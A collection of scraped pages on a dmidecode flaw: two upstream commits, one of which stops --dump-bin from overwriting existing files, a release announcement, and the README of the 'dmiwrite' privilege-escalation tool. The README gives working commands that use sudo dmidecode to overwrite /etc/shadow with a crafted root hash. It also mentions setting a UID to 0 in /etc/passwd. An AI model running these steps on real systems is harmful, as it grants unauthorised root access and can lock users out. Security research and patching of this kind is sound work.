=== Content from git.savannah.nongnu.org_8bafeb44_20250114_184556.html ===


| [cgit logo](/cgit/) | [index](/cgit/) : [dmidecode.git](/cgit/dmidecode.git/ "dmidecode.git") | master |
| --- | --- | --- |
|  |  |

| [summary](/cgit/dmidecode.git/)[refs](/cgit/dmidecode.git/refs/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)[log](/cgit/dmidecode.git/log/)[tree](/cgit/dmidecode.git/tree/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)[commit](/cgit/dmidecode.git/commit/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)[diff](/cgit/dmidecode.git/diff/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jean Delvare <jdelvare@suse.de> | 2023-02-20 14:53:31 +0100 |
| --- | --- | --- |
| committer | Jean Delvare <jdelvare@suse.de> | 2023-02-20 14:53:31 +0100 |
| commit | [6ca381c1247c81f74e1ca4e7706f70bdda72e6f2](/cgit/dmidecode.git/commit/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2) ([patch](/cgit/dmidecode.git/patch/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)) | |
| tree | [d9b660b6bf46bc3c10eb23ff8b0d2ceb354f126b](/cgit/dmidecode.git/tree/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2) | |
| parent | [d8cfbc808f387e87091c25e7d5b8c2bb348bb206](/cgit/dmidecode.git/commit/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) ([diff](/cgit/dmidecode.git/diff/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2&id2=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)) | |
| download | [dmidecode-6ca381c1247c81f74e1ca4e7706f70bdda72e6f2.tar.gz](/cgit/dmidecode.git/snapshot/dmidecode-6ca381c1247c81f74e1ca4e7706f70bdda72e6f2.tar.gz) | |

dmidecode: Do not let --dump-bin overwrite an existing fileMake sure that the file passed to option --dump-bin does not already
exist. In practice, it is rather unlikely that an honest user would
want to overwrite an existing dump file, while this possibility
could be used by a rogue user to corrupt a system file.
Signed-off-by: Jean Delvare <jdelvare@suse.de>
Reviewed-by: Jerry Hoemann <jerry.hoemann@hpe.com>
[Diffstat](/cgit/dmidecode.git/diff/?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)

| -rw-r--r-- | [dmidecode.c](/cgit/dmidecode.git/diff/dmidecode.c?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2) | 14 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [man/dmidecode.8](/cgit/dmidecode.git/diff/man/dmidecode.8?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2) | 3 | |  |  |  | | --- | --- | --- | |

2 files changed, 14 insertions, 3 deletions

| diff --git a/dmidecode.c b/dmidecode.cindex 6e7be63..82efa2d 100644--- a/[dmidecode.c](/cgit/dmidecode.git/tree/dmidecode.c?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)+++ b/[dmidecode.c](/cgit/dmidecode.git/tree/dmidecode.c?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)@@ -60,6 +60,7 @@ \* https://www.dmtf.org/sites/default/files/DSP0270\_1.0.1.pdf \*/ +#include <fcntl.h> #include <stdio.h> #include <string.h> #include <strings.h>@@ -5412,13 +5413,22 @@ static void dmi\_table\_string(const struct dmi\_header \*h, const u8 \*data, u16 ver static int dmi\_table\_dump(const u8 \*ep, u32 ep\_len, const u8 \*table, u32 table\_len) {+ int fd; FILE \*f; - f = fopen(opt.dumpfile, "wb");+ fd = open(opt.dumpfile, O\_WRONLY|O\_CREAT|O\_EXCL, 0666);+ if (fd == -1)+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("open");+ return -1;+ }++ f = fdopen(fd, "wb"); if (!f) { fprintf(stderr, "%s: ", opt.dumpfile);- perror("fopen");+ perror("fdopen"); return -1; } diff --git a/man/dmidecode.8 b/man/dmidecode.8index 62aa304..83affc2 100644--- a/[man/dmidecode.8](/cgit/dmidecode.git/tree/man/dmidecode.8?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)+++ b/[man/dmidecode.8](/cgit/dmidecode.git/tree/man/dmidecode.8?id=6ca381c1247c81f74e1ca4e7706f70bdda72e6f2)@@ -1,4 +1,4 @@-.TH DMIDECODE 8 "January 2019" "dmidecode"+.TH DMIDECODE 8 "February 2023" "dmidecode" .\" .SH NAME dmidecode \- \s-1DMI\s0 table decoder@@ -164,6 +164,7 @@ hexadecimal and \s-1ASCII\s0. This option is mainly useful for debugging. Do not decode the entries, instead dump the DMI data to a file in binary form. The generated file is suitable to pass to \fB--from-dump\fP later.+\fIFILE\fP must not exist. .TP .BR " " " " "--from-dump \fIFILE\fP" Read the DMI data from a binary file previously generated using |
| --- |

generated by [cgit v1.1](https://git.zx2c4.com/cgit/about/) at 2025-01-14 18:45:56 +0000



=== Content from github.com_a58663ff_20250114_184603.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadamreiser%2Fdmiwrite)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadamreiser%2Fdmiwrite)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=adamreiser%2Fdmiwrite)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[adamreiser](/adamreiser)
/
**[dmiwrite](/adamreiser/dmiwrite)**
Public

* [Notifications](/login?return_to=%2Fadamreiser%2Fdmiwrite) You must be signed in to change notification settings
* [Fork
  5](/login?return_to=%2Fadamreiser%2Fdmiwrite)
* [Star
   20](/login?return_to=%2Fadamreiser%2Fdmiwrite)

Privilege escalation using dmidecode

### License

[GPL-2.0 license](/adamreiser/dmiwrite/blob/master/LICENSE)

[20
stars](/adamreiser/dmiwrite/stargazers) [5
forks](/adamreiser/dmiwrite/forks) [Branches](/adamreiser/dmiwrite/branches) [Tags](/adamreiser/dmiwrite/tags) [Activity](/adamreiser/dmiwrite/activity)
 [Star](/login?return_to=%2Fadamreiser%2Fdmiwrite)

 [Notifications](/login?return_to=%2Fadamreiser%2Fdmiwrite) You must be signed in to change notification settings

* [Code](/adamreiser/dmiwrite)
* [Issues
  1](/adamreiser/dmiwrite/issues)
* [Pull requests
  0](/adamreiser/dmiwrite/pulls)
* [Actions](/adamreiser/dmiwrite/actions)
* [Projects
  0](/adamreiser/dmiwrite/projects)
* [Security](/adamreiser/dmiwrite/security)
* [Insights](/adamreiser/dmiwrite/pulse)

Additional navigation options

* [Code](/adamreiser/dmiwrite)
* [Issues](/adamreiser/dmiwrite/issues)
* [Pull requests](/adamreiser/dmiwrite/pulls)
* [Actions](/adamreiser/dmiwrite/actions)
* [Projects](/adamreiser/dmiwrite/projects)
* [Security](/adamreiser/dmiwrite/security)
* [Insights](/adamreiser/dmiwrite/pulse)

# adamreiser/dmiwrite

    master[Branches](/adamreiser/dmiwrite/branches)[Tags](/adamreiser/dmiwrite/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6 Commits](/adamreiser/dmiwrite/commits/master/) | | |
| [.gitignore](/adamreiser/dmiwrite/blob/master/.gitignore ".gitignore") | | [.gitignore](/adamreiser/dmiwrite/blob/master/.gitignore ".gitignore") |  |  |
| [LICENSE](/adamreiser/dmiwrite/blob/master/LICENSE "LICENSE") | | [LICENSE](/adamreiser/dmiwrite/blob/master/LICENSE "LICENSE") |  |  |
| [Makefile](/adamreiser/dmiwrite/blob/master/Makefile "Makefile") | | [Makefile](/adamreiser/dmiwrite/blob/master/Makefile "Makefile") |  |  |
| [README.md](/adamreiser/dmiwrite/blob/master/README.md "README.md") | | [README.md](/adamreiser/dmiwrite/blob/master/README.md "README.md") |  |  |
| [demo.sh](/adamreiser/dmiwrite/blob/master/demo.sh "demo.sh") | | [demo.sh](/adamreiser/dmiwrite/blob/master/demo.sh "demo.sh") |  |  |
| [dmiwrite.c](/adamreiser/dmiwrite/blob/master/dmiwrite.c "dmiwrite.c") | | [dmiwrite.c](/adamreiser/dmiwrite/blob/master/dmiwrite.c "dmiwrite.c") |  |  |
| [trojan\_shadow.in](/adamreiser/dmiwrite/blob/master/trojan_shadow.in "trojan_shadow.in") | | [trojan\_shadow.in](/adamreiser/dmiwrite/blob/master/trojan_shadow.in "trojan_shadow.in") |  |  |
| [util.c](/adamreiser/dmiwrite/blob/master/util.c "util.c") | | [util.c](/adamreiser/dmiwrite/blob/master/util.c "util.c") |  |  |
| [util.h](/adamreiser/dmiwrite/blob/master/util.h "util.h") | | [util.h](/adamreiser/dmiwrite/blob/master/util.h "util.h") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-2.0 license
# Privilege escalation using dmidecode

## Background

One of the most basic privilege escalation strategies is to look for dangerous
sudo configurations. The ability of programs such as vim to execute arbitrary
commands is well known. Wildcards can lend seemingly innocuous commands a
surprising amount of power. Even more dangerous are commands without set
arguments: it is not always remembered that this means the command can be run
with any arguments the user specifies. The capabilities of such commands to
execute other programs, or to read and write sensitive files, must be carefully
investigated.

## Scenario

On a recent engagement, I observed the following sudo configuration:

```
testuser@testhost:~ $ sudo -l

User testuser may run the following commands on testhost:
    (ALL) NOPASSWD: /usr/sbin/dmidecode

```

dmidecode is a utility for reading system hardware information in the
SMBIOS format: a standard maintained by the Distributed Management Task
Force. <https://www.nongnu.org/dmidecode/> is the implementation present
in most Linux distributions, including Debian and Red Hat, and was the
focus of this investigation.

```
testuser@testhost:~ $ /usr/sbin/dmidecode -h
Usage: dmidecode [OPTIONS]
Options are:
 -d, --dev-mem FILE     Read memory from device FILE (default: /dev/mem)
 -h, --help             Display this help text and exit
 -q, --quiet            Less verbose output
 -s, --string KEYWORD   Only display the value of the given DMI string
 -t, --type TYPE        Only display the entries of given type
 -u, --dump             Do not decode the entries
     --dump-bin FILE    Dump the DMI data to a binary file
     --from-dump FILE   Read the DMI data from a binary file
     --no-sysfs         Do not attempt to read DMI data from sysfs files
     --oem-string N     Only display the value of the given OEM string
 -V, --version          Display the version and exit

```

It should be apparent that dmidecode has some powerful I/O capabilities:
note the `--dev-mem` and `--dump-bin` options. By passing a carefully
constructed SMBIOS file as a memory device, we can cause dmidecode to
write nearly arbitrary output to `--dump-bin`.

## Exploit

`dmiwrite` will wrap an input payload in an SMBIOS file that can be read as a
memory device by dmidecode. `--dump-bin` will then cause dmidecode to write the
payload to the destination specified, prepended with 32 null bytes. These do
not prevent privilege escalation.

## Privilege escalation

We will overwrite `/etc/shadow` with a copy containing a known root
password hash. We can then `su` to root. Of course, this may lock other
users out of the system. In the engagement where I employed this, I used
a separate file read vulnerability to first obtain /etc/shadow, which I
used as a template, and restored /etc/shadow after escalating to root.
Another method is to set the unprivileged account to UID 0 in
/etc/passwd. Your environment and operational needs may vary.

```
make dmiwrite
./dmiwrite trojan_shadow.in evil.dmi

```

Copy `evil.dmi` to the target, then:

```
sudo dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/shadow

```

`trojan_shadow.in` should begin with a newline to prevent the null bytes from
interfering with the first entry.

If the target system is using an older version of dmidecode, you may
need to omit the --no-sysfs option.

## Technical details

Format is 32-bit SMBIOS 2.1.

dmidecode stack trace just prior to file write:

```
#0  write_dump (base=0x20, len=, data=, dumpfile= "/etc/shadow", add=0x0) at util.c:254
#1  dmi_table_dump (buf= "\nroot:", len=) at dmidecode.c:4607
#2  dmi_table (base=0x0, len=, num=0x1, ver=0x20100) at dmidecode.c:4778
#3  smbios_decode (buf= "_SM_", devmem= "evil.dmi", flags=0x1) at dmidecode.c:4887
#4  main (argc=, argv=) at dmidecode.c:5107

```

The 32 byte offset in write\_dump is hardcoded space for the SMBIOS entry point
structure and results in an fseek in the dump file to that offset. This
appears to be unavoidable, but by specifying an entry point length of zero, we
can prevent the second call to write\_dump, below, from actually writing out the
entry point structure, filling it with nulls instead.

```
#0  write_dump (base=0x0, len=0x0, data=, dumpfile= "/etc/shadow", add=0x1) at util.c:254
#1  smbios_decode (buf= "_SM_", devmem= "evil.dmi", flags=0x0) at dmidecode.c:4900
#2  main (argc=, argv=) at dmidecode.c:5107

```

## About

Privilege escalation using dmidecode

### Resources

[Readme](#readme-ov-file)
### License

[GPL-2.0 license](#GPL-2.0-1-ov-file)

[Activity](/adamreiser/dmiwrite/activity)
### Stars

[**20**
stars](/adamreiser/dmiwrite/stargazers)
### Watchers

[**2**
watching](/adamreiser/dmiwrite/watchers)
### Forks

[**5**
forks](/adamreiser/dmiwrite/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fadamreiser%2Fdmiwrite&report=adamreiser+%28user%29)

## [Releases](/adamreiser/dmiwrite/releases)

No releases published

## [Packages 0](/users/adamreiser/packages?repo_name=dmiwrite)

No packages published

## Languages

* [C
  86.3%](/adamreiser/dmiwrite/search?l=c)
* [Shell
  9.3%](/adamreiser/dmiwrite/search?l=shell)
* [Makefile
  4.4%](/adamreiser/dmiwrite/search?l=makefile)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.nongnu.org_a650b6f1_20250114_184604.html ===


| | **dmidecode-devel** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=dmidecode-devel)

---

[[Date Prev](msg00002.html)][[Date Next](msg00004.html)][[Thread Prev](msg00002.html)][[Thread Next](msg00004.html)][[Date Index](index.html#00003)][[Thread Index](threads.html#00003)]

## Dmidecode 3.5 has been released

---

| **From**: | Jean Delvare |
| --- | --- |

| **Subject**: | Dmidecode 3.5 has been released |
| **Date**: | Tue, 14 Mar 2023 18:09:57 +0100 |

---

```
Hi all,

Dmidecode 3.5 was released today. The changes from 3.4 are as follows:
* Decode HPE OEM records 216, 224, 230, 238 and 242.
* Fortify entry point length checks.
* Add a --no-quirks option.
* Drop the CPUID exception list.
* Do not let --dump-bin overwrite an existing file.
* Ensure /dev/mem is a character device file.
* Bug fixes:
  Fix segmentation fault in HPE OEM record 240
* Minor improvements:
  Typo fixes
  Write the whole dump file at once
  Fix a build warning when USE_MMAP isn't set

This new release is available for download from the usual place:
  <http://download.savannah.gnu.org/releases/dmidecode/dmidecode-3.5.tar.xz>
  <http://download.savannah.gnu.org/releases/dmidecode/dmidecode-3.5.tar.xz.sig>

Please allow for up to 24 hours before the files propagate to all
mirrors.

--
Jean Delvare
SUSE L3 Support

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [[Next in Thread](msg00004.html)] |
| --- | --- | --- |

* **Dmidecode 3.5 has been released**,
  *Jean Delvare* **<=**
  + **[Re: Dmidecode 3.5 has been released](msg00004.html)**, *Erwan Velu*, 2023/03/14

---

* Prev by Date:
  **[[PATCH] Fix a build warning when USE\_MMAP isn't set](msg00002.html)**
* Next by Date:
  **[Re: Dmidecode 3.5 has been released](msg00004.html)**
* Previous by thread:
  **[[PATCH] Fix a build warning when USE\_MMAP isn't set](msg00002.html)**
* Next by thread:
  **[Re: Dmidecode 3.5 has been released](msg00004.html)**
* Index(es):
  + [**Date**](index.html#00003)
  + [**Thread**](threads.html#00003)



=== Content from git.savannah.nongnu.org_346926c3_20250114_184601.html ===


| [cgit logo](/cgit/) | [index](/cgit/) : [dmidecode.git](/cgit/dmidecode.git/ "dmidecode.git") | master |
| --- | --- | --- |
|  |  |

| [summary](/cgit/dmidecode.git/)[refs](/cgit/dmidecode.git/refs/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)[log](/cgit/dmidecode.git/log/)[tree](/cgit/dmidecode.git/tree/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)[commit](/cgit/dmidecode.git/commit/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)[diff](/cgit/dmidecode.git/diff/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jean Delvare <jdelvare@suse.de> | 2023-02-20 14:53:25 +0100 |
| --- | --- | --- |
| committer | Jean Delvare <jdelvare@suse.de> | 2023-02-20 14:53:25 +0100 |
| commit | [d8cfbc808f387e87091c25e7d5b8c2bb348bb206](/cgit/dmidecode.git/commit/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) ([patch](/cgit/dmidecode.git/patch/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)) | |
| tree | [77fcda85146e243cf1163fc2721db685b71e9734](/cgit/dmidecode.git/tree/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) | |
| parent | [39b2dd7b6ab719b920e96ed832cfb4bdd664e808](/cgit/dmidecode.git/commit/?id=39b2dd7b6ab719b920e96ed832cfb4bdd664e808) ([diff](/cgit/dmidecode.git/diff/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206&id2=39b2dd7b6ab719b920e96ed832cfb4bdd664e808)) | |
| download | [dmidecode-d8cfbc808f387e87091c25e7d5b8c2bb348bb206.tar.gz](/cgit/dmidecode.git/snapshot/dmidecode-d8cfbc808f387e87091c25e7d5b8c2bb348bb206.tar.gz) | |

dmidecode: Write the whole dump file at onceWhen option --dump-bin is used, write the whole dump file at once,
instead of opening and closing the file separately for the table
and then for the entry point.
As the file writing function is no longer generic, it gets moved
from util.c to dmidecode.c.
One minor functional change resulting from the new implementation is
that the entry point is written first now, so the messages printed
are swapped.
Signed-off-by: Jean Delvare <jdelvare@suse.de>
Reviewed-by: Jerry Hoemann <jerry.hoemann@hpe.com>
[Diffstat](/cgit/dmidecode.git/diff/?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)

| -rw-r--r-- | [dmidecode.c](/cgit/dmidecode.git/diff/dmidecode.c?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) | 69 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [util.c](/cgit/dmidecode.git/diff/util.c?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) | 40 | |  |  |  | | --- | --- | --- | |
| -rw-r--r-- | [util.h](/cgit/dmidecode.git/diff/util.h?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206) | 1 | |  |  |  | | --- | --- | --- | |

3 files changed, 51 insertions, 59 deletions

| diff --git a/dmidecode.c b/dmidecode.cindex 0ab04da..6e7be63 100644--- a/[dmidecode.c](/cgit/dmidecode.git/tree/dmidecode.c?id=39b2dd7b6ab719b920e96ed832cfb4bdd664e808)+++ b/[dmidecode.c](/cgit/dmidecode.git/tree/dmidecode.c?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)@@ -5409,11 +5409,56 @@ static void dmi\_table\_string(const struct dmi\_header \*h, const u8 \*data, u16 ver } } -static void dmi\_table\_dump(const u8 \*buf, u32 len)+static int dmi\_table\_dump(const u8 \*ep, u32 ep\_len, const u8 \*table,+ u32 table\_len) {+ FILE \*f;++ f = fopen(opt.dumpfile, "wb");+ if (!f)+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("fopen");+ return -1;+ }++ if (!(opt.flags & FLAG\_QUIET))+ pr\_comment("Writing %d bytes to %s.", ep\_len, opt.dumpfile);+ if (fwrite(ep, ep\_len, 1, f) != 1)+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("fwrite");+ goto err\_close;+ }++ if (fseek(f, 32, SEEK\_SET) != 0)+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("fseek");+ goto err\_close;+ }+ if (!(opt.flags & FLAG\_QUIET))- pr\_comment("Writing %d bytes to %s.", len, opt.dumpfile);- write\_dump(32, len, buf, opt.dumpfile, 0);+ pr\_comment("Writing %d bytes to %s.", table\_len, opt.dumpfile);+ if (fwrite(table, table\_len, 1, f) != 1)+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("fwrite");+ goto err\_close;+ }++ if (fclose(f))+ {+ fprintf(stderr, "%s: ", opt.dumpfile);+ perror("fclose");+ return -1;+ }++ return 0;++err\_close:+ fclose(f);+ return -1; }  static void dmi\_table\_decode(u8 \*buf, u32 len, u16 num, u16 ver, u32 flags)@@ -5708,11 +5753,7 @@ static int smbios3\_decode(u8 \*buf, const char \*devmem, u32 flags) memcpy(crafted, buf, 32); overwrite\_smbios3\_address(crafted); - dmi\_table\_dump(table, len);- if (!(opt.flags & FLAG\_QUIET))- pr\_comment("Writing %d bytes to %s.", crafted[0x06],- opt.dumpfile);- write\_dump(0, crafted[0x06], crafted, opt.dumpfile, 1);+ dmi\_table\_dump(crafted, crafted[0x06], table, len); } else {@@ -5795,11 +5836,7 @@ static int smbios\_decode(u8 \*buf, const char \*devmem, u32 flags) memcpy(crafted, buf, 32); overwrite\_dmi\_address(crafted + 0x10); - dmi\_table\_dump(table, len);- if (!(opt.flags & FLAG\_QUIET))- pr\_comment("Writing %d bytes to %s.", crafted[0x05],- opt.dumpfile);- write\_dump(0, crafted[0x05], crafted, opt.dumpfile, 1);+ dmi\_table\_dump(crafted, crafted[0x05], table, len); } else {@@ -5840,11 +5877,7 @@ static int legacy\_decode(u8 \*buf, const char \*devmem, u32 flags) memcpy(crafted, buf, 16); overwrite\_dmi\_address(crafted); - dmi\_table\_dump(table, len);- if (!(opt.flags & FLAG\_QUIET))- pr\_comment("Writing %d bytes to %s.", 0x0F,- opt.dumpfile);- write\_dump(0, 0x0F, crafted, opt.dumpfile, 1);+ dmi\_table\_dump(crafted, 0x0F, table, len); } else {diff --git a/util.c b/util.cindex 04aaadd..1547096 100644--- a/[util.c](/cgit/dmidecode.git/tree/util.c?id=39b2dd7b6ab719b920e96ed832cfb4bdd664e808)+++ b/[util.c](/cgit/dmidecode.git/tree/util.c?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)@@ -259,46 +259,6 @@ out: return p; } -int write\_dump(size\_t base, size\_t len, const void \*data, const char \*dumpfile, int add)-{- FILE \*f;-- f = fopen(dumpfile, add ? "r+b" : "wb");- if (!f)- {- fprintf(stderr, "%s: ", dumpfile);- perror("fopen");- return -1;- }-- if (fseek(f, base, SEEK\_SET) != 0)- {- fprintf(stderr, "%s: ", dumpfile);- perror("fseek");- goto err\_close;- }-- if (fwrite(data, len, 1, f) != 1)- {- fprintf(stderr, "%s: ", dumpfile);- perror("fwrite");- goto err\_close;- }-- if (fclose(f))- {- fprintf(stderr, "%s: ", dumpfile);- perror("fclose");- return -1;- }-- return 0;--err\_close:- fclose(f);- return -1;-}- /\* Returns end - start + 1, assuming start < end \*/ u64 u64\_range(u64 start, u64 end) {diff --git a/util.h b/util.hindex 3094cf8..ef24eb9 100644--- a/[util.h](/cgit/dmidecode.git/tree/util.h?id=39b2dd7b6ab719b920e96ed832cfb4bdd664e808)+++ b/[util.h](/cgit/dmidecode.git/tree/util.h?id=d8cfbc808f387e87091c25e7d5b8c2bb348bb206)@@ -27,5 +27,4 @@ int checksum(const u8 \*buf, size\_t len); void \*read\_file(off\_t base, size\_t \*len, const char \*filename); void \*mem\_chunk(off\_t base, size\_t len, const char \*devmem);-int write\_dump(size\_t base, size\_t len, const void \*data, const char \*dumpfile, int add); u64 u64\_range(u64 start, u64 end); |
| --- |

generated by [cgit v1.1](https://git.zx2c4.com/cgit/about/) at 2025-01-14 18:46:01 +0000


